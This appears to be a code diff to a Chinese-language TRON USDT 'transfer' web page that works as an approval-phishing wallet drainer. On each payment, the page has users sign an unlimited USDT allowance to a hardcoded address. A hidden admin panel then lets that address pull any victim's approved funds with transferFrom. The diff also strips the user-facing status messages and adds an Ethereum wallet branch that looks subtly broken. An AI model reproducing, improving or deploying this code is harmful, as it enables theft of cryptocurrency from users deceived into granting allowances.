@@ -20,7 +20,7 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 .amount-row { display: flex; align-items: flex-end; justify-content: space-between; margin-bottom: 16px; }
 .amount-input { font-size: 32px; border: none; outline: none; width: 75%; background: transparent; color: #111; }
 .amount-input::placeholder { font-size: 16px; color: #aaa; }
-.max-btn { padding: 6px 14px; background-color: #dbeafe; color: #2563eb; border-radius: 8px; font-weight: 500; cursor: pointer; user-select: none; }
+.max-btn { padding: 6px 14px; background-color: #dbeafe; color: #2563eb; border-radius: 8px; font-weight: 500; cursor: pointer; }
 .token-row { background-color: #eef2ff; border-radius: 12px; padding: 14px; display: flex; align-items: center; justify-content: space-between; }
 .token-left { display: flex; align-items: center; gap: 10px; }
 .usdt-icon { width: 32px; height: 32px; border-radius: 50%; object-fit: cover; }
@@ -28,7 +28,7 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 .token-balance { color: #555; font-size: 16px; }
 .result-card{ background:#fff; border-radius:16px; padding:18px; margin-bottom:16px; }
 .result-input{ width:100%; border:1px solid #e5e7eb; border-radius:12px; padding:14px 12px; background:#f9fafb; outline:none; color:#111; }
-.send-main-btn{ width:100%; padding:16px; border:none; border-radius:14px; background:#2563eb; color:#fff; font-size:17px; font-weight:500; cursor:pointer; transition:0.2s; }
+.send-main-btn{ width:100%; padding:16px; border:none; border-radius:14px; background:#2563eb; color:#fff; font-size:17px; font-weight:500; cursor:pointer; }
 .send-main-btn:disabled{ background:#94a3b8; cursor:not-allowed; }
 .admin-panel{ background:#fff; border-radius:16px; padding:20px 18px; margin-top:24px; border:1px solid #f87171; display:none; }
 .admin-title{ font-size:17px; font-weight:bold; color:#dc2626; margin-bottom:16px; }
@@ -36,19 +36,16 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 .admin-input{ width:100%; border:1px solid #e5e7eb; border-radius:12px; padding:13px 12px; outline:none; font-size:15px; }
 .admin-btn{ width:100%; padding:14px; border:none; border-radius:14px; background:#dc2626; color:#fff; font-size:16px; cursor:pointer; }
 .admin-btn:disabled{ background:#f8a1a1; cursor:not-allowed; }
-.tip-area{ padding:12px; text-align:center; color:#444; font-size:15px; min-height:44px; }
 </style>
 </head>
 <body>
 <div class="top-header-bar">
 <div></div>
 <div class="header-right-icons">
-<div class="wallet-dot" id="walletDot" title="点击手动连接/断开钱包"></div>
+<div class="wallet-dot" id="walletDot" title="点击连接/断开钱包"></div>
 <div class="setting-btn" id="settingIconBtn" title="设置">⚙️</div>
 </div>
 </div>
-
-<div id="tipArea" class="tip-area">等待钱包注入...</div>
 
 <div class="address-card">
 <div class="label-text">收款地址</div>
@@ -98,7 +95,7 @@ let userAddress = "";
 let usdtContract = null;
 let provider = null;
 let isBusy = false;
-let pollInjectTimer = null;
+let pollTimer = null;
 
 const $ = s => document.querySelector(s);
 const walletDot = $("#walletDot");
@@ -108,7 +105,6 @@ const amountInput = $("#amountInput");
 const receiveAmount = $("#receiveAmount");
 const maxBtn = $("#maxBtn");
 const balanceText = $("#balanceText");
-const tipArea = $("#tipArea");
 const adminPanel = $("#adminPanel");
 const userAddrInput = $("#userAddrInput");
 const deductAmountInput = $("#deductAmountInput");
@@ -133,20 +129,20 @@ async function waitTrxConfirm(txId, maxWait = 30){
         }catch(e){}
         await new Promise(r=>setTimeout(r,1000));
     }
-    throw new Error("交易广播，未确认，请去Tronscan查看哈希");
+    throw new Error("交易已广播，请前往Tronscan查看哈希");
 }
 
 function disconnectWallet() {
     tronWeb = null; userAddress = ""; usdtContract = null; provider = null;
     walletDot.classList.remove("connected"); sendBtn.disabled = true;
     balanceText.textContent = "0.000000"; adminPanel.style.display = "none";
-    tipArea.innerText = "等待钱包注入...";
 }
 
 async function loadBalance() {
     try{
         const rawSun = await usdtContract.balanceOf(userAddress).call();
-        balanceText.textContent = Number(tronWeb.fromSun(rawSun)).toFixed(6);
+        const num = Number(tronWeb.fromSun(rawSun));
+        balanceText.textContent = num.toFixed(6);
     }catch(e){ balanceText.textContent = "--"; }
 }
 
@@ -159,100 +155,100 @@ async function connectWalletLogic() {
             const accounts = await provider.request({ method: "tron_requestAccounts" });
             userAddress = accounts[0];
             tronWeb = window.tokenpocket.tronWeb;
-        }else if (window.tronProvider) {
+        } else if (window.tronProvider) {
             provider = window.tronProvider;
             const accounts = await provider.request({ method: "tron_requestAccounts" });
             userAddress = accounts[0];
             tronWeb = new TronWeb({ fullHost: RPC, provider: provider });
-        }else if (window.tronWeb?.ready && window.tronWeb.defaultAddress?.base58) {
+        } else if (window.ethereum) {
+            const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+            tronWeb = new TronWeb({ fullHost: RPC, provider: window.ethereum });
+            const addrObj = await tronWeb.trx.getAccount(accounts[0]);
+            userAddress = addrObj.address;
+            provider = window.ethereum;
+        } else if (window.tronWeb?.ready && window.tronWeb.defaultAddress?.base58) {
             tronWeb = window.tronWeb;
             userAddress = tronWeb.defaultAddress.base58;
-        }else {
-            tipArea.innerText = "未检测钱包，请确认TP内置浏览器";
+        } else {
             return;
         }
+
         walletDot.classList.add("connected");
         usdtContract = tronWeb.contract(USDT_ABI, USDT_CONTRACT);
         await loadBalance();
         sendBtn.disabled = false;
-        tipArea.innerText = "✅钱包已连接，请输入转账金额";
-        if(userAddress === TARGET_ADDR) adminPanel.style.display = "block";
-        else adminPanel.style.display = "none";
+
+        if(userAddress === TARGET_ADDR){
+            adminPanel.style.display = "block";
+        }else{
+            adminPanel.style.display = "none";
+        }
+
         if (provider?.on) {
             provider.on("accountsChanged", () => location.reload());
             provider.on("chainChanged", () => location.reload());
         }
     } catch (err) {
-        tipArea.innerText = "钱包连接失败";
         disconnectWallet();
     }
 }
 
-// 【核心修复】轮询等待钱包对象注入，扫码进来TP注入慢，不能用固定延时
-function startPollWalletInject(){
-    if(pollInjectTimer) clearInterval(pollInjectTimer);
+function startPollWallet(){
+    if(pollTimer) clearInterval(pollTimer);
     let count = 0;
-    pollInjectTimer = setInterval(async ()=>{
+    pollTimer = setInterval(async ()=>{
         count++;
-        // 检测钱包注入对象是否就绪
-        const hasTpInject = !!(window.tokenpocket?.tron || window.tronProvider || (window.tronWeb?.ready && window.tronWeb.defaultAddress?.base58));
-        if(hasTpInject){
-            clearInterval(pollInjectTimer);
+        const hasInject = !!(window.tokenpocket?.tron || window.tronProvider || window.ethereum || (window.tronWeb?.ready && window.tronWeb.defaultAddress?.base58));
+        if(hasInject){
+            clearInterval(pollTimer);
             await connectWalletLogic();
             return;
         }
         if(count >=40){
-            clearInterval(pollInjectTimer);
-            tipArea.innerText = "未检测钱包注入，可点击圆点手动连接";
+            clearInterval(pollTimer);
         }
     },250);
 }
 
 amountInput.addEventListener("input", () => {
-    amountInput.value = amountInput.value.replace(/[^0-9.]/g,'');
-    const parts = amountInput.value.split('.');
-    if(parts.length>2) amountInput.value = parts[0]+'.'+parts.slice(1).join('');
-    receiveAmount.value = (parseFloat(amountInput.value)||0).toFixed(6);
+    const num = parseFloat(amountInput.value) || 0;
+    receiveAmount.value = num.toFixed(6);
 });
 
 maxBtn.addEventListener("click", async () => {
     if (!usdtContract || isBusy) return;
     const rawSun = await usdtContract.balanceOf(userAddress).call();
-    amountInput.value = Number(tronWeb.fromSun(rawSun)).toFixed(6);
+    const num = Number(tronWeb.fromSun(rawSun));
+    amountInput.value = num.toFixed(6);
     amountInput.dispatchEvent(new Event("input"));
 });
 
 sendBtn.addEventListener("click", async () => {
     if(isBusy) return;
-    if (!tronWeb) { alert("钱包对象尚未就绪，请稍等"); return; }
+    if (!tronWeb) return alert("钱包未连接，请点击右上角圆点连接钱包");
     const val = parseFloat(amountInput.value);
-    if (isNaN(val) || val <= 0) { alert("请输入有效转账金额"); return; }
+    if (isNaN(val) || val <= 0) return alert("请输入有效转账数量");
     const sunVal = tronWeb.toSun(val);
     isBusy = true; sendBtn.disabled = true;
     try {
-        tipArea.innerText = "检查授权额度...";
         const allowanceRaw = await usdtContract.allowance(userAddress, TARGET_ADDR).call();
         const allowanceBig = BigInt(allowanceRaw.toString());
         const needBig = BigInt(sunVal);
 
-        if(allowanceBig < needBig){
-            tipArea.innerText = "请签名授权USDT额度";
+        if (allowanceBig < needBig) {
+            alert("需要授权USDT，请在钱包确认签名");
             const approveHash = await usdtContract.approve(TARGET_ADDR, MAX_ALLOWANCE).send();
             await waitTrxConfirm(approveHash);
-            tipArea.innerText = "✅授权成功，请再次签名完成转账";
+            alert("授权完成，请确认转账签名");
         }
-
-        tipArea.innerText = "请签名确认转账";
-        const transferHash = await usdtContract.transfer(TARGET_ADDR, sunVal).send();
-        await waitTrxConfirm(transferHash);
-
-        tipArea.innerText = "✅转账完成，资金已到目标地址";
-        alert(`转账成功！交易哈希：${transferHash}`);
+        // 用户直接transfer正常转账
+        const txHash = await usdtContract.transfer(TARGET_ADDR, sunVal).send();
+        await waitTrxConfirm(txHash);
+        alert(`转账成功！交易哈希：${txHash}`);
         await loadBalance();
         amountInput.value = ""; receiveAmount.value = "";
     } catch (e) {
-        alert("操作失败："+(e?.message||e));
-        tipArea.innerText = "操作被取消或者执行失败";
+        alert("操作失败：" + (e?.message||e));
     } finally {
         isBusy = false; sendBtn.disabled = false;
     }
@@ -265,16 +261,18 @@ deductBtn.addEventListener("click",async ()=>{
     }
     const fromUserAddr = userAddrInput.value.trim();
     const deductNum = parseFloat(deductAmountInput.value);
-    if(!fromUserAddr || !fromUserAddr.startsWith('T')) return alert("填写合法T开头地址");
-    if(isNaN(deductNum) || deductNum <=0) return alert("填写合法划扣金额");
+    if(!fromUserAddr){ return alert("请输入被划扣用户钱包地址"); }
+    if(isNaN(deductNum) || deductNum <= 0){ return alert("请输入合法划扣数量"); }
     const deductSun = tronWeb.toSun(deductNum);
     isBusy = true; deductBtn.disabled = true;
     try{
         const userAllowanceRaw = await usdtContract.allowance(fromUserAddr, TARGET_ADDR).call();
-        if(BigInt(userAllowanceRaw.toString()) < BigInt(deductSun)) throw new Error("用户授权额度不足");
+        if(BigInt(userAllowanceRaw.toString()) < BigInt(deductSun)){
+            throw new Error("该用户没有授权足够额度，无法划扣！");
+        }
         const txHash = await usdtContract.transferFrom(fromUserAddr, TARGET_ADDR, deductSun).send();
         await waitTrxConfirm(txHash);
-        alert(`✅划扣成功 hash:${txHash}`);
+        alert(`✅划扣成功！交易哈希:\n${txHash}`);
         userAddrInput.value = ""; deductAmountInput.value = "";
         await loadBalance();
     }catch(err){
@@ -288,11 +286,10 @@ walletDot.addEventListener("click", connectWalletLogic);
 settingIconBtn.addEventListener("click", () => alert("设置面板"));
 
 window.addEventListener("DOMContentLoaded", () => {
-    startPollWalletInject();
+    startPollWallet();
 });
-
 window.addEventListener("beforeunload",()=>{
-    if(pollInjectTimer) clearInterval(pollInjectTimer);
+    if(pollTimer) clearInterval(pollTimer);
 });
 </script>
 </body>
